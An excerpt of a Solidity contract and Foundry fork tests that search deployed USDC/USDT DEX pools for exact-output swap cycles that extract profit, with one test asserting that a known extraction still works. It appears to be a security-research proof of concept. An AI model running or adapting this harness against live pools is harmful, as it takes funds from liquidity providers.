...
contract CompositeRouteExecutor {
    ...
    /// @dev Exact-output on both legs. The second leg requests exactly the
    /// token0 amount paid on leg one, so a positive token1 delta is a closed
    /// cycle with the initial asset fully restored.
    function outThenOut(address poolA, address poolB, uint256 amountOut1)
        external returns (uint256 amountIn0, uint256 amountIn1, int256 delta0, int256 delta1)
    {
...
contract LowFeeCompositeRoutesTest is Test {
    ...
    uint256 internal constant FORK_BLOCK = 25_687_404;
    ...
    function test_Dex2OutOut() public {
        int256 best = _searchOutThenOut(DEX2, DEX2, "DEX2 out-out");
        assertGe(best, 1, "known deployed closed-cycle extraction disappeared");
    }
    function test_Dex2ToDex34OutOut() public {
        _searchOutThenOut(DEX2, DEX34, "DEX2->DEX34 out-out");
    }
    function test_Dex34ToDex2OutOut() public {
        _searchOutThenOut(DEX34, DEX2, "DEX34->DEX2 out-out");
    }
    function test_Dex34OutOut() public {
        _searchOutThenOut(DEX34, DEX34, "DEX34 out-out");
    }
    ...
    function _candidate(uint256 i) internal pure returns (uint256) {
        uint256[35] memory amounts = [
            uint256(100), 101, 102, 103, 104, 105, 106, 107, 108, 109,
            110, 111, 112, 113, 114, 115, 116, 117, 118, 119,
            120, 121, 125, 150, 199, 200, 201, 250, 500, 750,
            1_000, 10_000, 100_000, 1_000_000, 100_000_000
        ];
        return amounts[i];
    }

    function _freshExecutor(address poolA, address poolB)
        internal returns (CompositeRouteExecutor executor)
    {
        executor = new CompositeRouteExecutor(USDC, USDT, poolA, poolB);
        deal(USDC, address(executor), 1_000_000_000_000);
    }

    function _searchOutThenOut(address poolA, address poolB, string memory label)
        internal returns (int256 best)
    {
        int256 bestOther;
        uint256 bestAmount;
        uint256 bestFirst;
        ...
        for (uint256 i; i < 35; i++) {
            ...
            CompositeRouteExecutor executor = _freshExecutor(poolA, poolB);
            uint256 amount = _candidate(i);
            uint256 gasBefore = gasleft();
            try executor.outThenOut(poolA, poolB, amount) returns (
